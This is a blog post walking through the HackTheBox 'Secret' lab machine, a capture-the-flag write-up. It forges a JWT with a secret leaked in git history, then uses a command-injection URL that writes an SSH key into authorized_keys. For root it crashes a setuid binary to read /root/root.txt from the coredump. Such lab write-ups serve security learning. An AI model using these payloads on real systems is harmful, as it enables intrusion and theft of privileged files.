<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackTheBox: "Secret" Walkthrough | Micha's Attic</title><meta name=keywords content="hackthebox,ctf"><meta name=description content="Foothold As usual, this machine has a landing page - we will find a ZIP file there, which we download, of course. We will immediately notice the .git folder, so let&rsquo;s use git log to inspect what happened there. One of the commit messages sounds interesting:
 removed .env for security reasons
 Let&rsquo;s inspect the changes introduced by this commit:
-TOKEN_SECRET = gXr67TtoQL8TS... +TOKEN_SECRET = secret This sounds a lot like a real world scenario - left over credentials in a git repository are not unheard of."><meta name=author content="Micha"><link rel=canonical href=https://blog.micha.gg/2022/04/25/hackthebox-secret-walkthrough/><link crossorigin=anonymous href=/assets/css/stylesheet.min.79a4c9cb65f7123f4c4abeceb6301a04f3860036c1b9bf5fe9749f7df83ac0cf.css integrity="sha256-eaTJy2X3Ej9MSr7OtjAaBPOGADbBub9f6XSfffg6wM8=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.micha.gg/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.micha.gg/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.micha.gg/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.micha.gg/apple-touch-icon.png><link rel=mask-icon href=https://blog.micha.gg/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.97.3"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox: &#34;Secret&#34; Walkthrough"><meta property="og:description" content="Foothold As usual, this machine has a landing page - we will find a ZIP file there, which we download, of course. We will immediately notice the .git folder, so let&rsquo;s use git log to inspect what happened there. One of the commit messages sounds interesting:
 removed .env for security reasons
 Let&rsquo;s inspect the changes introduced by this commit:
-TOKEN_SECRET = gXr67TtoQL8TS... +TOKEN_SECRET = secret This sounds a lot like a real world scenario - left over credentials in a git repository are not unheard of."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.micha.gg/2022/04/25/hackthebox-secret-walkthrough/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-25T00:22:15+02:00"><meta property="article:modified_time" content="2022-04-25T00:22:15+02:00"><meta property="og:site_name" content="Micha's Attic"><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: &#34;Secret&#34; Walkthrough"><meta name=twitter:description content="Foothold As usual, this machine has a landing page - we will find a ZIP file there, which we download, of course. We will immediately notice the .git folder, so let&rsquo;s use git log to inspect what happened there. One of the commit messages sounds interesting:
 removed .env for security reasons
 Let&rsquo;s inspect the changes introduced by this commit:
-TOKEN_SECRET = gXr67TtoQL8TS... +TOKEN_SECRET = secret This sounds a lot like a real world scenario - left over credentials in a git repository are not unheard of."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.micha.gg/posts/"},{"@type":"ListItem","position":2,"name":"HackTheBox: \"Secret\" Walkthrough","item":"https://blog.micha.gg/2022/04/25/hackthebox-secret-walkthrough/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox: \"Secret\" Walkthrough","name":"HackTheBox: \u0022Secret\u0022 Walkthrough","description":"Foothold As usual, this machine has a landing page - we will find a ZIP file there, which we download, of course. We will immediately notice the .git folder, so let\u0026rsquo;s use git log to inspect what happened there. One of the commit messages sounds interesting:\n removed .env for security reasons\n Let\u0026rsquo;s inspect the changes introduced by this commit:\n-TOKEN_SECRET = gXr67TtoQL8TS... +TOKEN_SECRET = secret This sounds a lot like a real world scenario - left over credentials in a git repository are not unheard of.","keywords":["hackthebox","ctf"],"articleBody":"Foothold As usual, this machine has a landing page - we will find a ZIP file there, which we download, of course. We will immediately notice the .git folder, so let’s use git log to inspect what happened there. One of the commit messages sounds interesting:\n removed .env for security reasons\n Let’s inspect the changes introduced by this commit:\n-TOKEN_SECRET = gXr67TtoQL8TS... +TOKEN_SECRET = secret This sounds a lot like a real world scenario - left over credentials in a git repository are not unheard of.\nNow, let’s explore the contents of the ZIP file further. In the file private.js we find this particular interesting snippet:\nrouter.get('/logs', verifytoken, (req, res) = {  const file = req.query.file;  const userinfo = { name: req.user }  const name = userinfo.name.name;   if (name == 'theadmin'){  const getLogs = `git log --oneline ${file}`;  exec(getLogs, (err , output) ={  if(err){  res.status(500).send(err);  return  }  res.json(output);  })  }  else{  res.json({  role: {  role: \"you are normal user\",  desc: userinfo.name.name  }  })  } }) User The path is clear: Forge a JWT token for user “theadmin” and use the “file” query parameter to execute arbitrary commands:\nhttp://10.10.11.120:3000/api/logs?file=x; mkdir ~/.ssh;chmod 700 ~/.ssh; echo \"ssh-rsa ...\"  ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys; Note that I’ve added line breaks for better readability. Also note that before sending this request, the query parameter must be URL encoded - otherwise the command will break, for example because the + character will be interpreted as space. Anway, we can now login via SSH and are done with the first part.\nNB: I always set the permissions like this, because I once had a machine were it didn’t work when the permissions were not exactly like this - and debugging this cost me a long time.\nRoot Up next: Privilege escalation. As usual, I’m relying on LinPEAS to give me a hint - which it does. LinPEAS shows us that /opt/count is a setuid binary. As such, it can read every file on the system. The output is some kind of word/line count, so we don’t get access to the file contents.\nNow, everything that I tried to interfere with the execution of this binary failed. Or, to be more precise, everytime I tried something (like running the binary with gdb), the setuid bit gets dropped. Guess that makes sense, otherwise we could also attach to binaries like sudo…\nConveniently, we’ll find the source code of the binary next to it. Here is the interesting part (in the lines before the following snippet, the input file is read):\n// drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(\"Save results a file? [y/N]: \"); res = getchar(); Let’s look at the manpage of prctl:\n PR_SET_DUMPABLE: Set the state of the “dumpable” flag, which determines whether core dumps are produced for the calling process upon delivery of a signal whose default behavior is to produce a core dump. […] Normally, this flag is set to 1. However, it is reset to the current value contained in the file /proc/sys/fs/suid_dumpable (which by default has the value 0), in the following circumstances: The process’s effective user or group ID is changed. […]\n So again, we have a way forward: Run the binary, read /root/root.txt, and as soon as the prompt appears, produce a coredump using:\nkill -SIGSEGV $(pidof count) Now, were can we find that coredump? Let’s check:\n$ cat /proc/sys/kernel/core_pattern |/usr/share/apport/apport %p %s %c %d %P %E We see that this machine uses Apport. Apport comes with some tools, one is:\n apport-unpack: Unpack a report into single files (one per attribute). This is most useful for extracting the core dump. Please see the manpage for further details. This tool is not necessary when working with Launchpad, since it already splits the parts into separate attachments.\n All right - let’s try it:\n$ apport-unpack /var/crash/_opt_count.1000.crash tmp/ $ strings tmp/CoreDump That’s it! :smile:\nConclusion and Learnings I was able to get the user flag really quick - having credentials in a git repository and forging a JWT token was not too interesting. But the privilege escalation took me quite a bit, as I lost a lot of time on trying to somehow attach to the binary. Only after I was out of ideas, I looked in the folder where the binary is to find the source code - and the obvious clue. From there, finding out how to provoke a segfault and read the coredump also took some time, but could be done with a few searches.\n","wordCount":"750","inLanguage":"en","datePublished":"2022-04-25T00:22:15+02:00","dateModified":"2022-04-25T00:22:15+02:00","author":{"@type":"Person","name":"Micha"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.micha.gg/2022/04/25/hackthebox-secret-walkthrough/"},"publisher":{"@type":"Organization","name":"Micha's Attic","logo":{"@type":"ImageObject","url":"https://blog.micha.gg/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.micha.gg/ accesskey=h title="Micha's Attic (Alt + H)">Micha's Attic</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://blog.micha.gg/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.micha.gg/>Home</a>&nbsp;»&nbsp;<a href=https://blog.micha.gg/posts/>Posts</a></div><h1 class=post-title>HackTheBox: "Secret" Walkthrough</h1><div class=post-meta><span title="2022-04-25 00:22:15 +0200 +0200">April 25, 2022</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Micha</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#foothold aria-label=Foothold>Foothold</a></li><li><a href=#user aria-label=User>User</a></li><li><a href=#root aria-label=Root>Root</a></li><li><a href=#conclusion-and-learnings aria-label="Conclusion and Learnings">Conclusion and Learnings</a></li></ul></div></details></div><div class=post-content><h1 id=foothold>Foothold<a hidden class=anchor aria-hidden=true href=#foothold>#</a></h1><p>As usual, this machine has a landing page - we will find a ZIP file there,
which we download, of course. We will immediately notice the <code>.git</code> folder,
so let&rsquo;s use <code>git log</code> to inspect what happened there. One of the commit
messages sounds interesting:</p><blockquote><p>removed .env for security reasons</p></blockquote><p>Let&rsquo;s inspect the changes introduced by this commit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span><span style=color:#f92672>-TOKEN_SECRET = gXr67TtoQL8TS...
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+TOKEN_SECRET = secret
</span></span></span></code></pre></div><p>This sounds a lot like a real world scenario - left over credentials in a
git repository are not unheard of.</p><p>Now, let&rsquo;s explore the contents of the ZIP file further. In the file <code>private.js</code>
we find this particular interesting snippet:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>router</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/logs&#39;</span>, <span style=color:#a6e22e>verifytoken</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>file</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>file</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>userinfo</span> <span style=color:#f92672>=</span> { <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span> }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>userinfo</span>.<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>name</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>name</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;theadmin&#39;</span>){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>getLogs</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`git log --oneline </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>file</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>exec</span>(<span style=color:#a6e22e>getLogs</span>, (<span style=color:#a6e22e>err</span> , <span style=color:#a6e22e>output</span>) =&gt;{
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>err</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>500</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>err</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>(<span style=color:#a6e22e>output</span>);
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>role</span><span style=color:#f92672>:</span> {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>role</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;you are normal user&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>desc</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>userinfo</span>.<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>name</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>})
</span></span></code></pre></div><h1 id=user>User<a hidden class=anchor aria-hidden=true href=#user>#</a></h1><p>The path is clear: Forge a JWT token for user &ldquo;theadmin&rdquo; and use the &ldquo;file&rdquo;
query parameter to execute arbitrary commands:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>http://10.10.11.120:3000/api/logs?file=x;
</span></span><span style=display:flex><span>mkdir ~/.ssh;chmod 700 ~/.ssh;
</span></span><span style=display:flex><span>echo &#34;ssh-rsa ...&#34; &gt; ~/.ssh/authorized_keys;
</span></span><span style=display:flex><span>chmod 600 ~/.ssh/authorized_keys;
</span></span></code></pre></div><p>Note that I&rsquo;ve added line breaks for better readability. Also note that before
sending this request, the query parameter must be URL encoded - otherwise the
command will break, for example because the <code>+</code> character will be interpreted as space.
Anway, we can now login via SSH and are done with the first part.</p><p><em>NB: I <strong>always</strong> set the permissions like this, because I once had a machine were it didn&rsquo;t work
when the permissions were not exactly like this - and debugging this cost me a long time.</em></p><h1 id=root>Root<a hidden class=anchor aria-hidden=true href=#root>#</a></h1><p>Up next: Privilege escalation. As usual, I&rsquo;m relying on LinPEAS to give me a hint - which it does.
LinPEAS shows us that <code>/opt/count</code> is a setuid binary. As such, it can read every file on the system.
The output is some kind of word/line count, so we don&rsquo;t get access to the file contents.</p><p>Now, everything that I tried to interfere with the execution of this binary failed. Or, to be more
precise, everytime I tried something (like running the binary with gdb), the setuid bit gets dropped.
Guess that makes sense, otherwise we could also attach to binaries like <code>sudo</code>&mldr;</p><p>Conveniently, we&rsquo;ll find the source code of the binary next to it. Here is the interesting part
(in the lines before the following snippet, the input file is read):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// drop privs to limit file write
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>setuid(getuid());
</span></span><span style=display:flex><span><span style=color:#75715e>// Enable coredump generation
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>prctl(PR_SET_DUMPABLE, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>printf(<span style=color:#e6db74>&#34;Save results a file? [y/N]: &#34;</span>);
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> getchar();
</span></span></code></pre></div><p>Let&rsquo;s look at the manpage of prctl:</p><blockquote><p><strong>PR_SET_DUMPABLE:</strong> Set the state of the &ldquo;dumpable&rdquo; flag, which determines whether core dumps are
produced for the calling process upon delivery of a signal whose default behavior
is to produce a core dump. [&mldr;]
Normally, this flag is set to 1. However, it is reset to the current value
contained in the file /proc/sys/fs/suid_dumpable (which by default has the value
0), in the following circumstances:
The process&rsquo;s effective user or group ID is changed. [&mldr;]</p></blockquote><p>So again, we have a way forward: Run the binary, read <code>/root/root.txt</code>, and
as soon as the prompt appears, produce a coredump using:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>kill -SIGSEGV $(pidof count)
</span></span></code></pre></div><p>Now, were can we find that coredump? Let&rsquo;s check:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>$ cat /proc/sys/kernel/core_pattern
</span></span><span style=display:flex><span>|/usr/share/apport/apport %p %s %c %d %P %E
</span></span></code></pre></div><p>We see that this machine uses <a href=https://wiki.ubuntu.com/Apport>Apport</a>.
Apport comes with some tools, one is:</p><blockquote><p><strong>apport-unpack</strong>: Unpack a report into single files (one per attribute). This is most useful for extracting the core dump. Please see the manpage for further details. This tool is not necessary when working with Launchpad, since it already splits the parts into separate attachments.</p></blockquote><p>All right - let&rsquo;s try it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>$ apport-unpack /var/crash/_opt_count.1000.crash tmp/
</span></span><span style=display:flex><span>$ strings tmp/CoreDump
</span></span></code></pre></div><p>That&rsquo;s it! :smile:</p><h1 id=conclusion-and-learnings>Conclusion and Learnings<a hidden class=anchor aria-hidden=true href=#conclusion-and-learnings>#</a></h1><p>I was able to get the user flag really quick - having credentials in a git
repository and forging a JWT token was not too interesting.
But the privilege escalation took me quite a bit, as I lost a lot of time
on trying to <em>somehow</em> attach to the binary. Only after I was out of ideas,
I looked in the folder where the binary is to find the source code - and the
obvious clue. From there, finding out how to provoke a segfault and read
the coredump also took some time, but could be done with a few searches.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.micha.gg/tags/hackthebox/>hackthebox</a></li><li><a href=https://blog.micha.gg/tags/ctf/>ctf</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://blog.micha.gg/>Micha's Attic</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>